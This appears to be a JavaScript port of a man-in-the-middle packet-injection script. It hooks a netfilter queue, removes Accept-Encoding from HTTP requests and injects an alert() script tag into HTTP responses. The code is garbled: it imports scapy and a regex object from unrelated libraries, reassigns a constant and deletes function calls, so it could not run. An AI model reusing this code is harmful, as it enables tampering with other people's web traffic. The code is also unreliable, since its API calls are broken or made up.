    const { NetfilterQueue } = require("netfilterqueue");
    const { IP, TCP, Raw } = require("scapy/lib/scapy");
    const { re } = require("rethinkdb");

    function setLoad(packet, load) {
      packet.setField("load", load);
      delete packet.setField("len");
      delete packet.setField("chksum");
      delete packet.setField("TCP").setField("chksum");
      return packet;
    }

    function processPacket(packet) {
      const scapyPacket = new IP(packet.getPayload());
      if (scapyPacket.hasField(Raw)) {
        const load = scapyPacket.getField(Raw).load;
        if (scapyPacket.getField(TCP).dport === 80) {
          console.log("[+] Request");
          load = re.replace("Accept-Encoding:.*?\\r\\n", "", load);
        } else if (scapyPacket.getField(TCP).sport === 80) {
          console.log("[+] Response");
          load = load.replace("<body</body>", "<script>alert('test');</script></body>");
          const contentLengthSearch = re.search("Content-Length:\\s\\d*", load);
          if (contentLengthSearch) {
            const contentLength = contentLengthSearch.group(0);
            console.log(contentLength);
          }
        }
        if (load!== scapyPacket.getField(Raw).load) {
          const newPacket = setLoad(scapyPacket, load);
          packet.setPayload(newPacket.toString());
        }
      }
      packet.accept();
    }

    const queue = new NetfilterQueue();
    queue.bind(0, processPacket);
    queue.run();
